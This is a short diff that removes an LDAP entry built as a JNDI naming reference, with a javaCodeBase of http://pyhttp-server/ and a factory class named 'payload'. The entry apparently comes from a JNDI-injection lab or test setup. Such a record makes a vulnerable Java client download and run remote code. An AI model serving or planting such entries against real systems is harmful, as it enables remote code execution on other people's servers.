@@ -1,4 +1,0 @@
-javaClassName: foo
-javaCodeBase: http://pyhttp-server/
-objectClass: javaNamingReference
-javaFactory: payload
